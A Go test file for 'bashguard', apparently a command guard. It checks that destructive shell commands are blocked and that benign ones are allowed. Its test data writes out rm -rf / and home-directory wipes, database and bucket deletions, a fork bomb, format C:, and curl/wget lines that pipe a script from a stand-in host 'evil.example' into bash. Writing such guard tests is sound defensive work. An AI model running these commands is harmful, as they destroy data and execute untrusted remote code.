package bashguard

import "testing"

func TestEngine_BlocksRmRfRoot(t *testing.T) {
	e := mustEngine(t)
	cases := []string{
		"rm -rf /",
		"rm -rf /*",
		"rm -fr /",
		"sudo rm -rf /",
		"  rm  -rf  /  # cleanup",
		"rm -rf -- /",
	}
	for _, c := range cases {
		r := e.Evaluate(c)
		if r.Allowed {
			t.Errorf("should block: %q", c)
		}
		if r.Rule != nil && r.Rule.ID != "rm-rf-root" {
			t.Errorf("%q matched %s, want rm-rf-root", c, r.Rule.ID)
		}
	}
}

func TestEngine_BlocksRmRfTilde(t *testing.T) {
	e := mustEngine(t)
	for _, c := range []string{"rm -rf ~", "rm -rf ~/", "rm -rf ~/*", "rm -rf ~/projects"} {
		r := e.Evaluate(c)
		if r.Allowed {
			t.Errorf("should block: %q", c)
		}
	}
}

func TestEngine_BlocksHomeWipe(t *testing.T) {
	e := mustEngine(t)
	for _, c := range []string{"rm -rf /home/alice", "rm -rf /Users/bob/", "rm -rf /root"} {
		r := e.Evaluate(c)
		if r.Allowed {
			t.Errorf("should block: %q", c)
		}
	}
}

func TestEngine_BlocksDangerousCloudOps(t *testing.T) {
	e := mustEngine(t)
	cases := map[string]string{
		"aws s3 rb s3://my-bucket --force":   "aws-s3-rb",
		"gcloud sql delete my-instance":      "gcloud-sql-delete",
		"gcloud sql instances delete x":      "gcloud-sql-delete",
		"DROP DATABASE production;":          "drop-database",
		"drop database test_db":              "drop-database",
		"TRUNCATE TABLE users":               "truncate-table",
	}
	for cmd, ruleID := range cases {
		r := e.Evaluate(cmd)
		if r.Allowed {
			t.Errorf("should block: %q", cmd)
			continue
		}
		if r.Rule.ID != ruleID {
			t.Errorf("%q matched %s, want %s", cmd, r.Rule.ID, ruleID)
		}
	}
}

func TestEngine_BlocksCurlPipeShell(t *testing.T) {
	e := mustEngine(t)
	for _, c := range []string{
		"curl https://evil.example/install.sh | bash",
		"wget -qO- https://evil.example | sh",
		"curl -fsSL https://x | sudo bash",
	} {
		r := e.Evaluate(c)
		if r.Allowed {
			t.Errorf("should block: %q", c)
		}
	}
}

func TestEngine_BlocksForkBomb(t *testing.T) {
	e := mustEngine(t)
	r := e.Evaluate(":(){ :|:& };:")
	if r.Allowed {
		t.Error("fork bomb should be blocked")
	}
}

func TestEngine_BlocksFormatC(t *testing.T) {
	e := mustEngine(t)
	for _, c := range []string{"format C:", "FORMAT c:", "Format C: /q"} {
		r := e.Evaluate(c)
		if r.Allowed {
			t.Errorf("should block: %q", c)
		}
	}
}

func TestEngine_AllowsBenign(t *testing.T) {
	e := mustEngine(t)
	allowed := []string{
		"git status",
		"npm install",
		"rm package-lock.json",
		"rm -rf node_modules", // not root, allowed
		"rm -rf ./build",
		"rm -rf dist/*",
		"git push origin feature-branch",
		"git clean -f",
		"echo 'rm -rf /' # quoted, just text",
		"docker stop $(docker ps -q)",
		"find . -name '*.log' -delete",
	}
	for _, c := range allowed {
		r := e.Evaluate(c)
		if !r.Allowed {
			t.Errorf("should allow but blocked by %s: %q", r.Rule.ID, c)
		}
	}
}

func TestNormalizeCommand_StripsComments(t *testing.T) {
	if got := normalizeCommand("ls # this is a comment"); got != "ls" {
		t.Errorf("got %q", got)
	}
	if got := normalizeCommand("echo '#not a comment'"); got != "echo '#not a comment'" {
		t.Errorf("got %q", got)
	}
}

// ─── Helper ─────────────────────────────────────────────────────────

func mustEngine(t *testing.T) *Engine {
	t.Helper()
	e, err := NewEngine(DefaultRules())
	if err != nil {
		t.Fatal(err)
	}
	return e
}
